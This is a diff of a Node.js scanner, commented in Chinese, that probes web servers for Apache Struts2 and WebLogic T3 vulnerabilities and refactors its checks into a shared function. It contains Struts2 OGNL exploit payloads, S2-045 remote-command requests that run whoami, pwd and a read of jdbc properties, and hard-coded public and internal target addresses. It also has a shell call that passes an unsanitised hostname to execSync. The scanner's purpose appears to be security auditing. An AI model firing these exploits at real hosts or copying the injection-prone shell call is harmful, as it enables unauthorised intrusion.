@@ -30,7 +30,6 @@ var a = process.argv.splice(2);
 // 结合当前argv参数，生成payload
 fnMkPayload();
 
-
 g_szUrl = program.url || 1 == a.length && a[0] || "";
 if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
 	g_szUrl += "/";
@@ -38,7 +37,7 @@ if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
 if(-1 == g_szUrl.indexOf("http"))
 	g_szUrl = "http://" + g_szUrl;
 
-// 安装包
+// 生成安装包信息：package.json
 if(program.install)
 {
 	var aI,szT = fs.readFileSync(__filename),
@@ -53,7 +52,7 @@ if(program.install)
 	process.exit(0);
 }
 
-// 代理设置
+// 设置代理设置
 if(program.proxy)
 {
 	request = request.defaults({'proxy': program.proxy});
@@ -63,68 +62,6 @@ if(program.proxy)
 		process.env[a1[0].toLowerCase() + "_proxy"] = program.proxy;
 		try{require('global-tunnel').initialize()}catch(e){}
 	}
-}
-
-var g_host2Ip = {};
-// tomcat测试
-// https://www.exploit-db.com/exploits/41783/
-// /?{{%25}}cake\=1
-// /?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1
-// 基于socket发送数据
-function fnSocket(h,p,szSend,fnCbk)
-{
-	var s, rIp = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/gmi;
-
-	if(h && !(s = rIp.exec(h)))
-	{
-		if(g_host2Ip[h])h = g_host2Ip[h];
-		else
-		{
-			s = child_process.execSync("host " + h);
-			s = rIp.exec(s);
-			if(s)g_host2Ip[h] = s[0],h = s[0];
-
-		}
-	}
-	try{
-		const client = net.connect(fnOptHeader({"port": p,"host":h}), () => 
-		{
-		  client.write(szSend);
-		});
-		client.on('data', (data) => 
-		{
-			fnCbk(data);
-			client.end();
-		});
-		client.on('end', () =>{});
-	}catch(e){}
-}
-
-// check weblogic T3
-// sort ip.txt|uniq>ip2.txt;mv ip2.txt ip.txt
-function checkWeblogicT3(h,p)
-{
-	var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
-	var s = "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n";
-	// var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
-	p || (p = nPort);
-	fnLog(s);
-	fnSocket(h,p,s,function(data)
-	{
-		data=(data||"").toString().trim();
-		if(data && -1 == data.indexOf("Bad Request") && -1 < data.indexOf("10.3."))
-		{
-			g_oRst.t3 = {r:data,des:"建议关闭T3协议，或者限定特定ip可访问"};
-			fnLog(g_oRst.t3.r);
-			console.log("found T3 " + h + ":" + p);
-		}
-		// else console.log("not found T3 " + h + ":" + p + " " + data);
-		/*
-		var d = data && data.toString().trim() || "", 
-			re = /^HELO:(\d+\.\d+\.\d+\.\d+)\./gm;
-		console.log(d);
-		console.log(re.test(d));*/
-	});
 }
 
 /*
@@ -171,40 +108,21 @@ function fnCheckWeblogicCve201710271(url)
 	// post 500
 	// 确认
 }
-
-// checkWeblogicT3("192.168.18.89",7001);
+// t3检测
 if(program.t3)
 {
 	var nPort = -1 < g_szUrl.indexOf("https")? 443: 80;
 	if("string" == typeof program.t3)
 	{
-		var aT1 = fs.readFileSync(program.t3).toString().trim().split("\n"), p,
-		    g_oT11 = {};
+		var aT1 = fs.readFileSync(program.t3).toString().trim().split("\n"), p;
 		for(var k in aT1)
 		{
-			aT1[k] = aT1[k].replace(/(^.*?\/\/)|(\/.*?$)|(\s*)/gmi,'');
-			p = aT1[k].split(":");
-			p[1] = p[1] || nPort;
-			if(2 < p.length)
-				console.log("地址正确："+ p);
-			var szIp = p.join(":");
-			if(!g_oT11[szIp])
-			{
-				g_oT11[szIp] = 1;
-				checkWeblogicT3(p[0], p[1]);
-			}
+			runChecks(aT1[k],"t3,weblogic");
 		}
 	}
 	else
 	{
-		var rIp = /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d+)?/gmi, r1 = rIp.exec(g_szUrl);
-		if(!r1)
-		{
-			var s = g_szUrl.replace(/([https]*?:\/\/)|(\/.*?$)/gmi,'').split(":");
-			r1 = ['',s[0], 1 == s.length ? nPort: s[1]];
-		}
-		// console.log(r1);
-		checkWeblogicT3(r1[1],r1[2]);
+		runChecks(g_szUrl,"t3,weblogic");
 	};
 
 }
@@ -466,155 +384,6 @@ function myLog(a)
 	*/
 }
 g_oRst.struts2 || (g_oRst.struts2 = {});
-
-/*
-获取表单数据，并推进表单字段测试
-*/
-var g_oForm = {};
-function fnDoForm(s,url)
-{
-	if(s && url)
-	{
-		var re = /<input .*?name=['"]*([^'"]+)['"]*\s[^>]*>/gmi;
-		while(a = re.exec(s))
-		{
-			var oT = g_oForm[url] || (g_oForm[url] = {});
-			if(!oT[a[1]])
-			{
-				oT[a[1]] = 1;
-				// console.log(url + "  " + a[1]);
-				fnTestStruts2(url, {name:a[1]});
-			}
-		}
-	}
-}
-
-function fnDoBody(body,t,url,rep)
-{
-	// win 字符集处理
-	if(body && -1 < String(body).indexOf("[^\/]administrator"))
-	{
-		 try{body = iconv.decode(body,"cp936").toString("utf8");}catch(e){}
-		 // console.log(body);
-	}
-	if(body)body = body.toString();
-	fnDoForm(body,url);
-	if( -1 < String(body||"").indexOf(".(#ros.flush()") ||
-		-1 < String(body||"").indexOf("org.apache.commons.io.IOUtils"))return;
-		
-
-	var e = fnGetErrMsg(body);
-	if(e)g_oRst.errMsg = e.toString().replace(/<[^>]*>/gmi,'');//.trim();
-	// console.log(t);
-	var oCa = arguments.callee.caller.arguments;
-	if(!rep)rep = oCa[1];
-	// error msg
-	if(oCa[0])fnLog(oCa[0]);
-	var repT = oCa[1] || {};
-	
-	// safegene
-	if(repT && repT.headers && repT.headers['safegene_msg'])
-		fnLog(decodeURIComponent(repT.headers['safegene_msg']));
-
-
-	if(repT && repT.headers && repT.headers["struts2"])
-		g_oRst.struts2[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
-
-	body||(body = "");
-	if(!body)
-	{
-		// myLog(arguments);
-	}
-
-	if(!body)return;
-	body = body.toString("utf8").trim();
-	var rg1 = /(__VIEWSTATEGENERATOR)|(java\.io\.InputStreamReader)|(org\.apache\.struts2\.ServletActionContext)|(\.getWriter)/gmi;
-	if(rg1.test(body) || -1 < body.indexOf("pwd%3a") || -1 < body.indexOf("echo+whoami"))return;
-
-	//console.log(body.indexOf("echo+whoami"));return;
-	g_oRst.config || (g_oRst.config = {});
-	if(!g_oRst.config["server"] && -1 < body.indexOf("at weblogic.work"))
-	{
-		g_oRst.config["server"] = "配置缺失；信息泄露中间件为weblogic";
-	}
-	// at 
-	if(!g_oRst.config["dev"])
-	{
-		var re = /Exception\s+at ([^\(]+)\(/gmi;
-			re = re.exec(body);
-		if(re && 0 < re.length)
-		{
-			g_oRst.config["dev"] = "配置缺失；信息泄露开发商为:" + re[1];
-		}
-	}
-	if(!g_oRst.config["x-powered-by"] && rep && rep.headers)
-	{
-		if(rep.headers["x-powered-by"] && -1 < rep.headers["x-powered-by"].indexOf("JSP/"))
-		{
-			g_oRst.config["x-powered-by"] = "配置缺失；信息泄露实现技术：" + rep.headers["x-powered-by"];
-		}
-	}
-	if(!g_oRst.config["server"] && rep && rep.headers)
-	{
-		if(rep.headers["server"] && -1 < rep.headers["server"].indexOf("/"))
-		{
-			g_oRst.config["server"] = "配置缺失；信息泄露实现技术：" + rep.headers["server"];
-		}
-	}
-
-	var nwhoami = 0;
-	if(t && program.cmd && -1 == body.indexOf("<body"))console.log(t + "\n" + body);
-	if(!body || -1 == (nwhoami = body.indexOf("whoami")))return;
-	
-	//if(-1 < t.indexOf("s2-001"))console.log(body)
-	body = body.substr(nwhoami);
-	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
-	if(-1 < i)body = body.substr(0,i);
-	// if("s2-045" == t)console.log(body)
-	// if(-1 < t.indexOf("s2-053"))console.log(body);
-	// 误报
-	if(-1 < body.indexOf("<body") && -1 == body.indexOf("whoami:") && -1 == body.indexOf("pwd:"))
-	{
-		console.log(body);
-		return;
-	}
-	console.log("发现高危漏洞("+ (rep && rep.request && rep.request.uri &&rep.request.uri.href || "") +"):\n" + t);
-	
-	if(0 < i) body = body.substr(0, i).trim().replace(/\u0000/gmi,'');
-	// console.log(body);
-	var oT = g_oRst.struts2,s1 = String(body).split(/\n/);
-	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
-	if(-1 < body.indexOf("root") && !oT["root"])
-		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
-	if(s1[0] && 50 > s1[0].length && !oT["user"])
-		oT["user"] = "当前中间件启动的用户：" + String(-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
-	var szMdPath = (3 < s1.length ? s1[3] : "").trim();
-	if(1 < s1.length && !oT["CurDir"] && szMdPath)
-		oT["CurDir"] = {des:"当前中间件目录","path":szMdPath};
-}
-
-function doStruts2_045(url, fnCbk)
-{
-	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
-	//  && cat #curPath/WEB-INF/jdbc.propertis
-	// if(/\/$/.test(url))url = url.substr(0, url.length - 1);
-	request(fnOptHeader({method: 'POST',uri: url
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	// encodeURIComponent不能编码 2017-07-18
-	    	"Content-Type":g_postData
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
-	  			// console.log(body);
-	  			fnDoBody(body,"s2-045 CVE-2017-5638",url);
-	  		}
-	    }
-	  );
-}
 
 // S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
 function doStruts2_DevMode(url)
@@ -882,86 +651,14 @@ function fnCheckJavaFx(s)
 	});
 	
 }
-// 缓存正则表达式，便于提高效率
-var g_reKeys = null;
 
-function fnCheckKeys(b)
-{
-	var a,s,r = [],re = /<.*?type=['"]*password['"]*\s[^>]*>/gmi, r1 = /autocomplete=['"]*(off|0|no|false)['"]*/gmi;
-	g_oRst.checkKeys || (g_oRst.checkKeys = {});
-	var oMp = {}, ss;
-	if(!g_oRst.checkKeys.passwordInputs)
-	{
-		while(a = re.exec(b))
-		{
-			if(!r1.exec(a[0]))
-			{
-				ss = a[0].replace(/[\r\n\t"'']/gmi,"").replace(/\s+/gmi," ");
-				if(!oMp[ss])
-					oMp[ss] = 1,r.push(ss);
-			}
-		}
-		if(0 < r.length)g_oRst.checkKeys.passwordInputs = {"des":"密码字段应该添加autocomplete=off",list:r};
-	}
-	oMp = {};
-	s = program.keys || "./urls/keywords";
-	if(!g_oRst.checkKeys.keys && fs.existsSync(s))
-	{
-		a = g_reKeys || new RegExp("(" + String(fs.readFileSync(s)).trim().replace(/\n/gmi,"|") + ")=","gmi");
-		g_reKeys = a;
-		re = [];
-		while(s = a.exec(b))
-		{
-			if(!oMp[s[1]])
-				oMp[s[1]]=1,re.push(s[1]);
-		}
-		if(0 < re.length)g_oRst.checkKeys.keys = {"des":"这些关键词在网络中容易被监听，请更换",list:re};
-	}
-}
 
 var g_reServer = /(Tomcat|JBossWeb|JBoss[\-\/][\d\.]+)/gmi;
 
-// 获取Ta3异常消息
-function fnGetErrMsg(body)
-{
-	if(body)
-	{
-		body = body.toString();
-		fnCheckKeys(body);
-		var s1 = "Base._dealdata(", i = body.indexOf(s1);
-		if(-1 < i)body = body.substr(i + s1.length);
-		s1 = "});";
-		i = body.indexOf(s1);
-		if(-1 < i)body = body.substr(0, i + 1);
-		try
-		{
-			if(g_reServer)
-			{
-				var oS = g_reServer.exec(body);
-				if(oS && 0 < oS.length && g_oRst.server)g_oRst.server += " " + oS[1],g_reServer = null;
-			}
-			var o = JSON.parse(body = body.replace(/'/gmi,"\"").replace(/\t/gmi,"\\t\\n").replace(/&nbsp;/gmi," "));
-			return o.errorDetail;
-		}catch(e)
-		{
-			var bHv = false;
-			i = body.indexOf("at com.");
-			if(bHv = -1 < i)body = body.substr(i - 11);
-			i = body.lastIndexOf("at ");
-			if(-1 < i)bHv = true,body = body.substr(0,i);
-			if(bHv)return body;
-		}
-	}
-	return "";
-}
+
 
 // 避免重复处理
 var g_HtmlMd5Cf = {};
-
-function fnLog(s)
-{
-	if(program.verbose)console.log(s.toString());
-}
 
 // 避免重复,后期可以支持字典目录，多个字典目录，这样可以扫描更多
 var g_mUrls = {};
@@ -1612,7 +1309,8 @@ function fnTestStruts2(szUrl2, obj)
 		a[k].call(fnGetCpy(),szUrl2);
 	}
 
-	a = [doStruts2_005,doStruts2_008,doStruts2_015,doStruts2_016,doStruts2_019,doStruts2_032,doStruts2_033,doStruts2_037,doStruts2_DevMode,doStruts2_045,doStruts2_046];
+	runChecks(szUrl2,"struts2,045");
+	a = [doStruts2_005,doStruts2_008,doStruts2_015,doStruts2_016,doStruts2_019,doStruts2_032,doStruts2_033,doStruts2_037,doStruts2_DevMode,doStruts2_046];
 	if(!obj)
 	for(var k in a)
 	{
@@ -1681,7 +1379,8 @@ if(program.test)
 	for(var i in a)
 		fnMyPut(a[i].trim());*/
 	//*
-	checkWeblogicT3("125.71.203.122","9088");
+	runChecks("http://125.71.203.122:9088/","t3,weblogic");
+	runChecks("http://192.168.10.216:8082/s2-032/","struts2,045");
 	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
  	doStruts2_005.call({name:null},"http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
 	doStruts2_032.call({name:null},"http://192.168.10.216:8088/s2-032/memoindex.action");
@@ -1695,7 +1394,7 @@ if(program.test)
 	doStruts2_033(g_szUrl);
 	doStruts2_037(g_szUrl);
 	doStruts2_DevMode(g_szUrl);
-	doStruts2_045(g_szUrl);
+
 	// 文件上传测试
 	doStruts2_046(g_szUrl);
 	doStruts2_048(g_szUrl);
